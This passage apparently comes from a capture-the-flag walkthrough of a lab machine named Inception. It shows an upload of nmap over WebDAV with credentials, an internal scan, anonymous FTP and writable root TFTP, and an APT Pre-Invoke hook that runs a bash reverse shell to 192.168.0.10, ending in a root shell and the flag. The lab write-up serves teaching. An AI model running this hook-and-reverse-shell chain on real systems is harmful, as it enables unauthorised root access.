/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro,data=ordered)
none on /dev type tmpfs (rw,nodev,relatime,size=492k,mode=755,uid=100000,gid=100000)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
sysfs on /sys type sysfs (rw,nodev,relatime)
udev on /dev/fuse type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
udev on /dev/net/tun type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
fusectl on /sys/fs/fuse/connections type fusectl (rw,relatime)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
mqueue on /dev/mqueue type mqueue (rw,relatime)
tmpfs on /dev/lxd type tmpfs (rw,relatime,size=100k,mode=755)
tmpfs on /dev/.lxd-mounts type tmpfs (rw,relatime,size=100k,mode=711)
lxcfs on /proc/cpuinfo type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
lxcfs on /proc/diskstats type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
lxcfs on /proc/meminfo type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
lxcfs on /proc/stat type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
lxcfs on /proc/swaps type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
lxcfs on /proc/uptime type fuse.lxcfs (rw,nosuid,nodev,relatime,user_id=0,group_id=0,allow_other)
udev on /dev/null type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
udev on /dev/zero type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
udev on /dev/full type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
udev on /dev/urandom type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
udev on /dev/random type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
udev on /dev/tty type devtmpfs (rw,nosuid,relatime,size=487780k,nr_inodes=121945,mode=755)
devpts on /dev/console type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
devpts on /dev/pts type devpts (rw,relatime,gid=100005,mode=620,ptmxmode=666)
devpts on /dev/ptmx type devpts (rw,relatime,gid=100005,mode=620,ptmxmode=666)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev,uid=100000,gid=100000)
tmpfs on /run type tmpfs (rw,nosuid,nodev,mode=755,uid=100000,gid=100000)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k,uid=100000,gid=100000)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755,uid=100000,gid=100000)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cobb@Inception:~$
```

```sh
cobb@Inception:~$ uname -a
Linux Inception 4.4.0-101-generic #124-Ubuntu SMP Fri Nov 10 18:29:59 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
cobb@Inception:~$
```

###### Getting nmap on Inception

[`static-binaries/binaries/linux/x86_64/nmap`](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)

```sh
root@kali:~/inception# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
--2018-06-25 20:31:40--  https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
Resolving github.com (github.com)... 192.30.255.112, 192.30.255.113
Connecting to github.com (github.com)|192.30.255.112|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap [following]
--2018-06-25 20:31:41--  https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/nmap
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: ‘nmap’

nmap                                               100%[================================================================================================================>]   5.67M  7.06MB/s    in 0.8s

2018-06-25 20:31:42 (7.06 MB/s) - ‘nmap’ saved [5944464/5944464]

root@kali:~/inception#
root@kali:~/inception# file nmap
nmap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
root@kali:~/inception#
```

```sh
root@kali:~/inception# curl -vvv --upload-file nmap http://10.10.10.67/webdav_test_inception/nmap --user webdav_tester:babygurl69
*   Trying 10.10.10.67...
* TCP_NODELAY set
* Connected to 10.10.10.67 (10.10.10.67) port 80 (#0)
* Server auth using Basic with user 'webdav_tester'
> PUT /webdav_test_inception/nmap HTTP/1.1
> Host: 10.10.10.67
> Authorization: Basic d2ViZGF2X3Rlc3RlcjpiYWJ5Z3VybDY5
> User-Agent: curl/7.60.0
> Accept: */*
> Content-Length: 5944464
> Expect: 100-continue
>
< HTTP/1.1 100 Continue
* We are completely uploaded and fine
< HTTP/1.1 201 Created
< Date: Tue, 26 Jun 2018 00:34:10 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Location: http://10.10.10.67/webdav_test_inception/nmap
< Content-Length: 278
< Content-Type: text/html; charset=ISO-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav_test_inception/nmap has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.67 Port 80</address>
</body></html>
* Connection #0 to host 10.10.10.67 left intact
root@kali:~/inception#
```

```sh
cobb@Inception:~$ cd /var/www/html/webdav_test_inception
cobb@Inception:/var/www/html/webdav_test_inception$ ls
nmap  shell.php  webdav.passwd
cobb@Inception:/var/www/html/webdav_test_inception$ cp nmap /dev/shm/
cobb@Inception:/var/www/html/webdav_test_inception$ cd /dev/shm/
cobb@Inception:/dev/shm$ chmod +x nmap
cobb@Inception:/dev/shm$ ./nmap
Nmap 6.49BETA1 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports <port ranges>: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
  --data <hex string>: Append a custom payload to sent packets
  --data-string <string>: Append a custom ASCII string to sent packets
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
cobb@Inception:/dev/shm$ arp -a
? (192.168.0.1) at fe:d6:b4:c3:83:16 [ether] on eth0
cobb@Inception:/dev/shm$
```

```sh
root@Inception:/dev/shm# ./nmap 192.168.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-06-26 01:02 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 192.168.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000024s latency).
Not shown: 1202 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
MAC Address: FE:D6:B4:C3:83:16 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 14.53 seconds
root@Inception:/dev/shm#
```

###### FTP Anonymous Login

```sh
root@Inception:~# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 30  2017 bin
drwxr-xr-x    3 0        0            4096 Nov 30  2017 boot
drwxr-xr-x   19 0        0            3920 Jun 25 02:11 dev
drwxr-xr-x   93 0        0            4096 Nov 30  2017 etc
drwxr-xr-x    2 0        0            4096 Nov 06  2017 home
lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -> boot/initrd.img-4.4.0-101-generic
lrwxrwxrwx    1 0        0              32 Nov 06  2017 initrd.img.old -> boot/initrd.img-4.4.0-98-generic
drwxr-xr-x   22 0        0            4096 Nov 30  2017 lib
drwxr-xr-x    2 0        0            4096 Oct 30  2017 lib64
drwx------    2 0        0           16384 Oct 30  2017 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
drwxr-xr-x    2 0        0            4096 Aug 01  2017 mnt
drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
dr-xr-xr-x  239 0        0               0 Jun 25 02:11 proc
drwx------    6 0        0            4096 Nov 08  2017 root
drwxr-xr-x   26 0        0             940 Jun 25 06:25 run
drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
drwxr-xr-x    2 0        0            4096 Apr 29  2017 snap
drwxr-xr-x    3 0        0            4096 Nov 06  2017 srv
dr-xr-xr-x   13 0        0               0 Jun 25 02:11 sys
drwxrwxrwt   10 0        0            4096 Jun 26 01:05 tmp
drwxr-xr-x   10 0        0            4096 Oct 30  2017 usr
drwxr-xr-x   13 0        0            4096 Oct 30  2017 var
lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
lrwxrwxrwx    1 0        0              29 Nov 06  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-98-generic
226 Directory send OK.
ftp> cd etc
250 Directory successfully changed.
ftp> cd default
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             346 Feb 09  2016 acpid
-rw-r--r--    1 0        0             149 Mar 31  2016 apport
-rw-r--r--    1 0        0             222 May 22  2012 bsdmainutils
-rw-r--r--    1 0        0             283 Oct 30  2017 console-setup
-rw-r--r--    1 0        0             549 Aug 23  2014 crda
-rw-r--r--    1 0        0             183 Apr 05  2016 cron
-rw-r--r--    1 0        0             652 Mar 28  2015 cryptdisks
-rw-r--r--    1 0        0             297 Dec 02  2015 dbus
-rw-r--r--    1 0        0              92 Jan 19  2016 devpts
-rw-r--r--    1 0        0            1252 Oct 30  2017 grub
drwxr-xr-x    2 0        0            4096 Feb 20  2017 grub.d
-rw-r--r--    1 0        0              86 Jan 19  2016 halt
-rw-r--r--    1 0        0             126 Oct 30  2017 irqbalance
-rw-r--r--    1 0        0             150 Oct 30  2017 keyboard
-rw-r--r--    1 0        0              54 Oct 30  2017 locale
-rw-r--r--    1 0        0            1208 Nov 06  2017 lxd-bridge
-rw-r--r--    1 0        0             830 Nov 30  2017 mdadm
-rw-r--r--    1 0        0             306 Jun 02  2015 networking
-rw-r--r--    1 0        0            1756 Apr 14  2016 nss
-rw-r--r--    1 0        0            2691 Mar 29  2016 open-iscsi
-rw-r--r--    1 0        0             620 Oct 30  2017 rcS
-rw-r--r--    1 0        0            1768 Sep 30  2013 rsync
-rw-r--r--    1 0        0             124 Jan 27  2016 rsyslog
-rw-r--r--    1 0        0             133 Mar 16  2017 ssh
-rw-r--r--    1 0        0             118 Nov 06  2017 tftpd-hpa
-rw-r--r--    1 0        0            1754 Apr 15  2016 ufw
-rw-r--r--    1 0        0            1118 Mar 29  2016 useradd
-rw-r--r--    1 0        0             316 Oct 26  2013 xinetd
226 Directory send OK.
ftp> get tftpd-hpa
local: tftpd-hpa remote: tftpd-hpa
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for tftpd-hpa (118 bytes).
226 Transfer complete.
118 bytes received in 0.00 secs (1.6796 MB/s)
ftp> exit
221 Goodbye.
root@Inception:~#
```

###### Finding TFTP as a Running Service

```sh
root@Inception:~# cat tftpd-hpa
# /etc/default/tftpd-hpa

TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
root@Inception:~#
```

```sh
root@Inception:~# tftp 192.168.0.1
tftp> get /etc/crontab
Received 842 bytes in 0.0 seconds
tftp> quit
root@Inception:~#
```

###### Using TFTP to grab crontab & creating a pre-invoke apt script

```sh
root@Inception:~# cat crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *	* * *	root	apt update 2>&1 >/var/log/apt/custom.log
30 23	* * *	root	apt upgrade -y 2>&1 >/dev/null
root@Inception:~#
```

```sh
root@Inception:~# vim writeupapt
root@Inception:~# cat writeupapt
APT::Update::Pre-Invoke {"/bin/bash /tmp/writeup.sh"}
root@Inception:~#
```

```sh
root@Inception:~# vim writeup.sh
root@Inception:~# cat writeup.sh
#!/bin/bash

bash -i >& /dev/tcp/192.168.0.10/1234 0>&1
root@Inception:~#
```

```sh
root@Inception:~# tftp 192.168.0.1
tftp> put writeup.sh /tmp/writeup.sh
Sent 59 bytes in 0.0 seconds
tftp> put writeupapt /etc/apt/apt.conf.d/00writeup
Sent 55 bytes in 0.0 seconds
tftp> quit
root@Inception:~#
```

```sh
root@Inception:~# nc -nlvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from [192.168.0.1] port 1234 [tcp/*] accepted (family 2, sport 44200)
bash: cannot set terminal process group (21468): Inappropriate ioctl for device
bash: no job control in this shell
root@Inception:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
root@Inception:/tmp# cd /root
cd /root
root@Inception:~# cat root.txt
cat root.txt
8d1e2e91de427a6fc1a9dc309d563359
root@Inception:~#
```

```sh
root@Inception:~# ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:8f:11:dd brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.67/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe8f:11dd/64 scope global mngtmpaddr dynamic
       valid_lft 86262sec preferred_lft 14262sec
    inet6 fe80::250:56ff:fe8f:11dd/64 scope link
       valid_lft forever preferred_lft forever
3: lxdbr0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether fe:d6:b4:c3:83:16 brd ff:ff:ff:ff:ff:ff
    inet 192.168.0.1/24 scope global lxdbr0
       valid_lft forever preferred_lft forever
    inet6 fe80::d445:cbff:fe5d:fa/64 scope link
       valid_lft forever preferred_lft forever
5: vethU65ODM@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master lxdbr0 state UP group default qlen 1000
    link/ether fe:d6:b4:c3:83:16 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fcd6:b4ff:fec3:8316/64 scope link
       valid_lft forever preferred_lft forever
root@Inception:~#
```